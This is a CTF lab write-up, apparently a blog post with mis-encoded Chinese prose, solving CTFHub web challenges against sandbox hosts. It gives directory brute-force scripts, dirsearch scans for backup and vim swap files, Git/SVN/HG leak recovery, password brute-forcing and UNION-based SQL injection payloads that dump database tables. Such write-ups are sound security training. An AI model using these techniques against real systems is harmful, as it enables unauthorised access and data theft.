<h3 id="å“åº”åŒ…æºä»£ç "><a href="#å“åº”åŒ…æºä»£ç " class="headerlink" title="å“åº”åŒ…æºä»£ç "></a>å“åº”åŒ…æºä»£ç </h3><p>æ‰“å¼€URLå‘ç°æ˜¯æ¸¸æˆ</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152147675.png" alt="1"></p>
<p>æ‰“å¼€æºä»£ç å‘ç°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152147590.png" alt="flag"></p>
<h1 id="ä¿¡æ¯æ³„éœ²"><a href="#ä¿¡æ¯æ³„éœ²" class="headerlink" title="ä¿¡æ¯æ³„éœ²"></a>ä¿¡æ¯æ³„éœ²</h1><h2 id="ç›®å½•éå†"><a href="#ç›®å½•éå†" class="headerlink" title="ç›®å½•éå†"></a>ç›®å½•éå†</h2><h4 id="æ³•ä¸€ï¼šBurp-Suite"><a href="#æ³•ä¸€ï¼šBurp-Suite" class="headerlink" title="æ³•ä¸€ï¼šBurp Suite"></a>æ³•ä¸€ï¼šBurp Suite</h4><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152149039.png" alt="0"></p>
<p>æ³¨æ„åˆ°ç›®å½•ä¸º4*4çš„æ–‡ä»¶å¤¹</p>
<p>è¿›å…¥åˆ°æœ€åä¸€çº§ç›®å½•ï¼Œå‘é€URLåˆ°intruderä¸­</p>
<p>åˆ†åˆ«é€‰æ‹©æ”»å‡»ç±»å‹ï¼šcluster bombï¼Œé€‰æ‹©å˜åŒ–çš„ä½ç½®ï¼Œè®¾ç½®payloadçš„setså’Œoptions</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152149124.png" alt="1"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152149552.png" alt="2"></p>
<p>è®¾ç½®å®Œæˆåå¼€å§‹</p>
<p>åœ¨ç»“æœé¡µä¸­å‘ç°é•¿åº¦æ˜æ˜¾ä¸ä¸€è‡´çš„è¿”å›ï¼ŒæŸ¥çœ‹è¿”å›å†…å®¹</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152150023.png" alt="3"></p>
<p>ä»è€Œå¾—åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152150584.png" alt="flag"></p>
<h4 id="æ³•äºŒï¼špython"><a href="#æ³•äºŒï¼špython" class="headerlink" title="æ³•äºŒï¼špython"></a>æ³•äºŒï¼špython</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge-0b7cf3fe1d9ef811.sandbox.ctfhub.com:10800/flag_in_here&quot;</span><span class="comment">#é¶æœºurl</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):<span class="comment">#iä¸º0-4çš„æ•°</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):<span class="comment">#jä¸º0-4çš„æ•°</span></span><br><span class="line">        url_final = url + <span class="string">&quot;/&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;/&quot;</span> + <span class="built_in">str</span>(j)<span class="comment">#å°†æœ€ç»ˆçš„ç›®å½•æ‹¼æ¥å‡ºæ¥</span></span><br><span class="line">        r = requests.get(url_final)<span class="comment">#è·å¾—æœåŠ¡å™¨è¿”å›çš„Response</span></span><br><span class="line">        r.encoding = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">        get_file=r.text<span class="comment">#å¾—åˆ°textå†…å®¹</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> get_file:<span class="comment">#åˆ¤æ–­flagæ˜¯å¦åœ¨è¿”å›å€¼ä¸­</span></span><br><span class="line">            <span class="built_in">print</span>(url_final)</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼Œå¾—åˆ°flagç›®å½•</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152150607.png" alt="4"></p>
<h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h2><p>æ‰“å¼€ç›®æ ‡urlï¼Œè¿›å…¥phpinfoç•Œé¢</p>
<p>æœç´¢flagå…³é”®è¯å¾—åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152148724.png" alt="flag"></p>
<h2 id="å¤‡ä»½æ–‡ä»¶ä¸‹è½½"><a href="#å¤‡ä»½æ–‡ä»¶ä¸‹è½½" class="headerlink" title="å¤‡ä»½æ–‡ä»¶ä¸‹è½½"></a>å¤‡ä»½æ–‡ä»¶ä¸‹è½½</h2><h3 id="ç½‘ç«™æºç "><a href="#ç½‘ç«™æºç " class="headerlink" title="ç½‘ç«™æºç "></a>ç½‘ç«™æºç </h3><h4 id="æ³•ä¸€ï¼šBurp-Suite-1"><a href="#æ³•ä¸€ï¼šBurp-Suite-1" class="headerlink" title="æ³•ä¸€ï¼šBurp Suite"></a>æ³•ä¸€ï¼šBurp Suite</h4><p>æ‰“å¼€urlå‘ç°æç¤ºç»™äº†å¸¸è§çš„æ–‡ä»¶åŠåç¼€å</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155349.png" alt="1"></p>
<p>è¿›å…¥bsæµè§ˆå™¨ï¼Œéšä¾¿è¾“ä¸€ä¸ªï¼Œä¾‹å¦‚:web.tarå°è¯•è®¿é—®</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155308.png" alt="2"></p>
<p>åœ¨å†å²è®°å½•ä¸­å°†è¯¥æ¬¡è®¿é—®å‘é€åˆ°intruderä¸­</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155837.png" alt="3"></p>
<p>åœ¨æºä»£ç ä¸­é€‰æ‹©æ”»å‡»ç±»å‹å¹¶é€‰ä¸­webå’Œtar</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155045.png" alt="4"></p>
<p>payloadsä¸­è½½å…¥è¦å˜åŒ–çš„æ–‡ä»¶å</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155514.png" alt="5"></p>
<p>å¡«å†™ä¸¤ä¸ªsetåå¼€å§‹æ”»å‡»ï¼Œæ‰¾åˆ°çŠ¶æ€ä¸º200çš„æ–‡ä»¶ï¼Œä¸‹è½½</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155141.png" alt="6"></p>
<p>å¾—åˆ°flag.txt</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155970.png" alt="7"></p>
<p>å°†è¯¥æ–‡ä»¶æ”¾å…¥æµè§ˆå™¨ä¸­å°è¯•æ‰“å¼€å¾—åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155598.png" alt="flag"></p>
<h4 id="æ³•äºŒ-dirsearch"><a href="#æ³•äºŒ-dirsearch" class="headerlink" title="æ³•äºŒ:dirsearch"></a>æ³•äºŒ:dirsearch</h4><p>åœ¨dirsearchç›®å½•ä¸­æ‰“å¼€powershellï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python .\dirsearch.py -u http://challenge-584841b234301423.sandbox.ctfhub.com:10800 -e tar,tar.gz,zip,rar -x 502,503</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œå®Œæˆåå¾—åˆ°å¤‡ä»½æ–‡ä»¶</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155127.png" alt="8"></p>
<p>åç»­æ­¥éª¤åŒæ³•ä¸€</p>
<h4 id="æ³•ä¸‰-python"><a href="#æ³•ä¸‰-python" class="headerlink" title="æ³•ä¸‰:python"></a>æ³•ä¸‰:python</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://challenge-584841b234301423.sandbox.ctfhub.com:10800/&quot;</span></span><br><span class="line">list1=[<span class="string">&#x27;web&#x27;</span>, <span class="string">&#x27;website&#x27;</span>, <span class="string">&#x27;backup&#x27;</span>, <span class="string">&#x27;back&#x27;</span>, <span class="string">&#x27;www&#x27;</span>, <span class="string">&#x27;wwwroot&#x27;</span>, <span class="string">&#x27;temp&#x27;</span>]</span><br><span class="line">list2=[<span class="string">&#x27;tar&#x27;</span>, <span class="string">&#x27;tar.gz&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;rar&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> list2:</span><br><span class="line">        url_final=url+i+<span class="string">&quot;.&quot;</span>+j</span><br><span class="line">        r=requests.get(url_final)</span><br><span class="line">        <span class="keyword">if</span>(r.status_code == <span class="number">200</span>):</span><br><span class="line">            <span class="built_in">print</span>(url_final)</span><br></pre></td></tr></table></figure>

<h3 id="bakæ–‡ä»¶"><a href="#bakæ–‡ä»¶" class="headerlink" title="bakæ–‡ä»¶"></a>bakæ–‡ä»¶</h3><p>æ‰“å¼€URLæœ‰ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154080.png" alt="1"></p>
<p>ä½¿ç”¨dirsearchæ‰«ææ–‡ä»¶</p>
<p>åœ¨dirsearchç›®å½•æ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python .\dirsearch.py -u http://challenge-b2eb848d1933d253.sandbox.ctfhub.com:10800 -e * -x 502,503</span><br></pre></td></tr></table></figure>

<p>ç­‰å¾…æ‰«æå®Œæˆå‘ç°æœ‰index.php.bakæ–‡ä»¶</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154858.png" alt="2"></p>
<p>ç›´æ¥ä¸‹è½½.bakæ–‡ä»¶æ‰“å¼€å‘ç°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154439.png" alt="flag"></p>
<h3 id="vimç¼“å­˜"><a href="#vimç¼“å­˜" class="headerlink" title="vimç¼“å­˜"></a>vimç¼“å­˜</h3><h4 id="æ³•ä¸€-dirsearch"><a href="#æ³•ä¸€-dirsearch" class="headerlink" title="æ³•ä¸€:dirsearch"></a>æ³•ä¸€:dirsearch</h4><p>æ‰“å¼€URLå¾—åˆ°æç¤º</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154166.png" alt="1"></p>
<p>ä½¿ç”¨dirsearchæ‰«æ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python .\dirsearch.py -u http://challenge-9a421211667ab5ac.sandbox.ctfhub.com:10800 -e swp -x 502,503</span><br></pre></td></tr></table></figure>

<p>ä¸»åŠ¨é€‰æ‹©.swpçš„åç¼€æ˜¯å› ä¸º-e *é»˜è®¤ä¸åŒ…æ‹¬swpæ–‡ä»¶</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154664.png" alt="2"></p>
<p>ä¸‹è½½index.php.swpåæ”¾å…¥linuxä¸­ä½¿ç”¨vimæ‰“å¼€</p>
<p>å…ˆä½¿ç”¨mvå°†index.php.swpæ”¹åä¸º.index.php.swp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv index.php.swp .index.php.swp</span><br></pre></td></tr></table></figure>

<p>å†ä½¿ç”¨vimæ‰“å¼€index.phpæ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim index.php</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154013.png" alt="3"></p>
<p>æŒ‰Ré€‰æ‹©æ¢å¤å¾—åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154710.png" alt="flag"></p>
<h4 id="æ³•äºŒ-ç›´æ¥è®¿é—®"><a href="#æ³•äºŒ-ç›´æ¥è®¿é—®" class="headerlink" title="æ³•äºŒ:ç›´æ¥è®¿é—®"></a>æ³•äºŒ:ç›´æ¥è®¿é—®</h4><p>ç”±é¢˜ç›®å¯å¾—è¦æ±‚å¾—åˆ°vimç¼“å­˜æ–‡ä»¶</p>
<p>æ•…ç›´æ¥è®¿é—®.index.php.swp(swp,swo,swn)</p>
<p>å¾—åˆ°index.php.swpæ–‡ä»¶ååŒæ³•ä¸€</p>
<h4 id="æ³•ä¸‰-curlï¼ˆæœªæˆåŠŸï¼‰"><a href="#æ³•ä¸‰-curlï¼ˆæœªæˆåŠŸï¼‰" class="headerlink" title="æ³•ä¸‰:curlï¼ˆæœªæˆåŠŸï¼‰"></a>æ³•ä¸‰:curlï¼ˆæœªæˆåŠŸï¼‰</h4><p>å¯ä»¥ç›´æ¥ä½¿ç”¨curlå‘½ä»¤æŸ¥çœ‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://challenge-9a421211667ab5ac.sandbox.ctfhub.com:10800/.index.php.swp</span><br></pre></td></tr></table></figure>

<p>ä½†å‡ºç°é—®é¢˜ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154095.png" alt="4"></p>
<h3 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h3><h4 id="æ³•ä¸€-dirsearch-linuxæŸ¥çœ‹"><a href="#æ³•ä¸€-dirsearch-linuxæŸ¥çœ‹" class="headerlink" title="æ³•ä¸€:dirsearch+linuxæŸ¥çœ‹"></a>æ³•ä¸€:dirsearch+linuxæŸ¥çœ‹</h4><p>dirsearchå¼€æ‰«</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152153541.png" alt="1"></p>
<p>å¾—åˆ°.DS_Storeæ–‡ä»¶ï¼Œä¸¢åˆ°æµè§ˆå™¨ä¸‹è½½ååœ¨linuxå†…æ‰“å¼€</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152153667.png" alt="2"></p>
<p>åœ¨çœ‹åˆ°.txtæ–‡ä»¶ï¼Œä¸¢åˆ°æµè§ˆå™¨ä¸­æ‰“å¼€å¾—åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152153584.png" alt="flag"></p>
<h4 id="æ³•äºŒ-dirsearch-python-dsstoreæŸ¥çœ‹"><a href="#æ³•äºŒ-dirsearch-python-dsstoreæŸ¥çœ‹" class="headerlink" title="æ³•äºŒ:dirsearch+python dsstoreæŸ¥çœ‹"></a>æ³•äºŒ:dirsearch+python dsstoreæŸ¥çœ‹</h4><p>åŒæ³•ä¸€ï¼Œå¾—åˆ°DS_Store</p>
<p>å°†å¾—åˆ°çš„æ–‡ä»¶ç”¨dsstoreæ‰“å¼€</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152153738.png" alt="3"></p>
<p>å¾—åˆ°.txtæ–‡ä»¶</p>
<h2 id="Gitæ³„éœ²"><a href="#Gitæ³„éœ²" class="headerlink" title="Gitæ³„éœ²"></a>Gitæ³„éœ²</h2><h3 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h3><p>dirsearchå¼€æ‰«</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152151130.png" alt="1"></p>
<p>çœ‹åˆ°æœ‰.gitæ–‡ä»¶å¤¹ï¼Œç”¨githackä¸‹ä¸‹æ¥ï¼ˆä»…æ”¯æŒpython2ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 Githack.py http://challenge-b4001d8a6ccbd18d.sandbox.ctfhub.com:10800/.git</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152151227.png" alt="2"></p>
<p>å»åˆ°.gitåŒçº§ç›®å½•ï¼Œè¾“å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹ä¹‹å‰å¯¹ä»“åº“çš„æ“ä½œï¼Œå‘ç°ç¬¬äºŒæ¬¡æ·»åŠ äº†flagï¼Œè€ƒè™‘æ¢å¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git reset --hard HEAD^</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git diff HEAD^</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°å†å²æ–‡ä»¶</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152579.png" alt="3"></p>
<p>æŸ¥çœ‹.txtæ–‡ä»¶å¾—åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152969.png" alt="flag"></p>
<h3 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h3><h4 id="æ³•ä¸€ï¼šgit-differ"><a href="#æ³•ä¸€ï¼šgit-differ" class="headerlink" title="æ³•ä¸€ï¼šgit differ"></a>æ³•ä¸€ï¼šgit differ</h4><p>dirsearchå¼€æ‰«</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152466.png" alt="1"></p>
<p>å‘ç°.gitï¼Œç”¨hackgitæŠ“ä¸‹æ¥ï¼Œå¾—åˆ°.gitæ–‡ä»¶å¤¹</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152801.png" alt="2"></p>
<p>è¿›å…¥.git&#x2F;refsï¼ŒæŸ¥çœ‹stashæ–‡ä»¶</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152478.png" alt="3"></p>
<p>åœ¨gtihashä¸­å¯¹æ¯”ä¸€ä¸‹ï¼Œå¾—åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152396.png" alt="flag"></p>
<h4 id="æ³•äºŒï¼šgit-stash-pop"><a href="#æ³•äºŒï¼šgit-stash-pop" class="headerlink" title="æ³•äºŒï¼šgit stash pop"></a>æ³•äºŒï¼šgit stash pop</h4><p>å¾—åˆ°.gitæ–‡ä»¶å¤¹åï¼Œç›´æ¥æŸ¥çœ‹stash</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152860.png" alt="5"></p>
<p>æ‰§è¡Œ<code>git stash pop</code>å‘ç°å¼¹å‡ºæ–‡ä»¶</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152563.png" alt="6"></p>
<p>æŸ¥çœ‹è¯¥æ–‡ä»¶å¾—åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152465.png" alt="flag-2"></p>
<h3 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h3><p>dirsearchå¼€æ‰«</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152150785.png" alt="1"></p>
<p>çœ‹åˆ°æœ‰.gitæ–‡ä»¶ï¼Œç”¨githackæŠ“å‡ºæ¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 .\GitHack.py http://challenge-241983fae914b573.sandbox.ctfhub.com:10800/.git`</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152150576.png" alt="2"></p>
<p>è¿›å…¥ç›®å½•ç›´æ¥çœ‹åˆ°.txtæ–‡ä»¶ï¼Œæ‰“å¼€å¾—åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152150144.png" alt="flag"></p>
<h2 id="SVNæ³„éœ²"><a href="#SVNæ³„éœ²" class="headerlink" title="SVNæ³„éœ²"></a>SVNæ³„éœ²</h2><p>dirsearchæ‰«å‡ºæ¥æœ‰.svnç›®å½•ï¼Œç”¨dvcs-ripperæ‰¾ä¸€ä¸‹svn</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152148622.png" alt="1"></p>
<p>è¿›å…¥.svnç›®å½•ï¼ˆéšè—æ–‡ä»¶å¤¹ï¼Œè¦ç”¨ls -aæŸ¥çœ‹ï¼‰ï¼Œåœ¨pristineç›®å½•ä¸­æœ‰ä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼Œæ‰¾åˆ°æ—§ç‰ˆçš„ï¼ˆ08ï¼‰</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152148364.png" alt="2"></p>
<p>catæŸ¥çœ‹æ–‡ä»¶å¾—åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152148693.png" alt="flag"></p>
<h2 id="HGæ³„éœ²"><a href="#HGæ³„éœ²" class="headerlink" title="HGæ³„éœ²"></a>HGæ³„éœ²</h2><p>dirsearchå¼€æ‰«å‘ç°æœ‰.hgæ®‹ç•™ï¼Œåœ¨kaliä¸­ç”¨dvcs-ripperæ‰¾ä¸€ä¸‹</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152148718.png" alt="1"></p>
<p>å‘ç°éƒ¨åˆ†404ï¼Œä½†æ˜¯åœ¨store-fncacheä¸­ä»æœ‰æ–‡ä»¶æ˜¾ç¤º</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152148457.png" alt="2"></p>
<p>æ‹¼æ¥url+flagå¾—åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152148992.png" alt="flag"></p>
<h1 id="å¯†ç å£ä»¤"><a href="#å¯†ç å£ä»¤" class="headerlink" title="å¯†ç å£ä»¤"></a>å¯†ç å£ä»¤</h1><h2 id="å¼±å£ä»¤"><a href="#å¼±å£ä»¤" class="headerlink" title="å¼±å£ä»¤"></a>å¼±å£ä»¤</h2><p>burpé‡ŒæŠ“åŒ…ç™»é™†è¯·æ±‚ï¼Œå‘é€åˆ°çˆ†ç ´æ¨¡ç»„é‡Œ</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152134978.png" alt="1"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152134686.png" alt="2"></p>
<p>é€‰ä¸Šä¸‹é¢çš„ç”¨æˆ·å¯†ç ï¼Œç”¨é›†æŸç‚¸å¼¹æ–¹å¼æ”»å‡»</p>
<p>payload1,2åˆ†åˆ«ä½¿ç”¨ç®€å•çš„å¼±å£ä»¤</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152135801.png" alt="3"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152136869.png" alt="4"></p>
<p>é€‰ä¸­é•¿åº¦æ’åºï¼Œå¾—åˆ°çˆ†ç ´æˆåŠŸçš„çš„å¯¹åº”å¯†ç ï¼ŒæŸ¥çœ‹responseå¾—åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152136843.png" alt="flag"></p>
<h2 id="é»˜è®¤å£ä»¤"><a href="#é»˜è®¤å£ä»¤" class="headerlink" title="é»˜è®¤å£ä»¤"></a>é»˜è®¤å£ä»¤</h2><p>æ‰“å¼€æ˜¯ç½‘å…³ç™»é™†ç•Œé¢ï¼Œè¿˜æœ‰éªŒè¯ç ï¼Œé‚£å°±æ²¡æ³•ç”¨intruderçˆ†ç ´å¯†ç äº†</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210190031447.png" alt="image-20221019003140324"></p>
<p>éšä¾¿è¯•ä¸€ä¸ªè´¦å·å¯†ç ï¼Œæ˜¾ç¤ºç”¨æˆ·ä¸å­˜åœ¨</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210190032401.png" alt="image-20221019003216381"></p>
<p>æŸ¥çœ‹æºä»£ç å‘ç°æ˜¯â€œäº¿é‚®é‚®ä»¶ç½‘å…³â€ï¼Œç»“åˆtitleçš„â€œé»˜è®¤å£ä»¤â€ï¼Œè¯•ä¸€ä¸‹æ˜¯å¦æ˜¯å‡ºå‚çš„é»˜è®¤è®¾ç½®</p>
<p>ç›´æ¥æœè¯¥ç½‘å…³çš„ç®¡ç†ç”¨æˆ·</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210190034857.png" alt="image-20221019003431841"></p>
<p>ä¸¢è¿›å»ç™»é™†å¾—åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210190035364.png" alt="image-20221019003507338"></p>
<h1 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h1><h2 id="æ•´æ•°å‹æ³¨å…¥"><a href="#æ•´æ•°å‹æ³¨å…¥" class="headerlink" title="æ•´æ•°å‹æ³¨å…¥"></a>æ•´æ•°å‹æ³¨å…¥</h2><p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308082747549.png" alt="image-20230308082747549"></p>
<p>æ•²<code>1 and 1=1</code>ä¸æŠ¥é”™ï¼Œ<code>1 and 1=2</code>æŠ¥é”™ï¼Œè¯´æ˜æ•´æ•°æ³¨å…¥ï¼Œç›´æ¥çŒœåˆ—æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 order by x</span><br></pre></td></tr></table></figure>

<p>xä¸ºæ•°å­—</p>
<p>å½“x&#x3D;3æ—¶æŠ¥é”™ï¼Œè¯´æ˜åªæœ‰ä¸¤åˆ—</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308083107879.png" alt="image-20230308083107879"></p>
<p>è”åˆæŸ¥è¯¢ï¼Œè®©æŸ¥è¯¢çš„id&#x3D;-1ï¼Œä½¿å¾—å‰é¢<code>select * from news where id=1</code>é”™è¯¯ï¼Œå›æ˜¾åé¢çš„unionå­—æ®µ</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308083202386.png" alt="image-20230308083202386"></p>
<p>æŸ¥åˆ°å½“å‰æ•°æ®åº“åä¸ºsqli</p>
<p>ç»§ç»­çˆ†è¡¨å</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1 union select 1,group_concat(table_name)from information_schema.tables where table_schema=&#x27;sqli&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308083452750.png" alt="image-20230308083452750"></p>
<p>å¾—åˆ°sqliçš„åº“ä¸­ä¸¤ä¸ªè¡¨ä¸ºflagå’Œnews</p>
<p>æŸ¥flagè¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308083655706.png" alt="image-20230308083655706"></p>
<p>æ‹¿flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1 union select 1,flag from sqli.flag</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308083728106.png" alt="image-20230308083728106"></p>
<h2 id="å­—ç¬¦å‹æ³¨å…¥"><a href="#å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="å­—ç¬¦å‹æ³¨å…¥"></a>å­—ç¬¦å‹æ³¨å…¥</h2><p>è¾“å…¥<code>1&#39;</code>æŠ¥é”™è€Œ<code>1&quot;</code>ä¸æŠ¥é”™ï¼Œè¯´æ˜æœ¬æ¬¡ç”¨çš„æ˜¯<code>&#39;</code>åˆ†å‰²</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by x #</span><br></pre></td></tr></table></figure>

<p>æŸ¥åˆ—æ•°</p>
<p>x&#x3D;3æŠ¥é”™</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308090536133.png" alt="image-20230308090536133"></p>
<p>è”åˆæŸ¥è¯¢</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,database() #</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308090612874.png" alt="image-20230308090612874"></p>
<p>çˆ†å‡ºåº“åï¼Œç»§ç»­çˆ†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;sqli&#x27; #</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308090757323.png" alt="image-20230308090757323"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27; #</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308091240197.png" alt="image-20230308091240197"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,flag from sqli.flag #</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308091314140.png" alt="image-20230308091314140"></p>
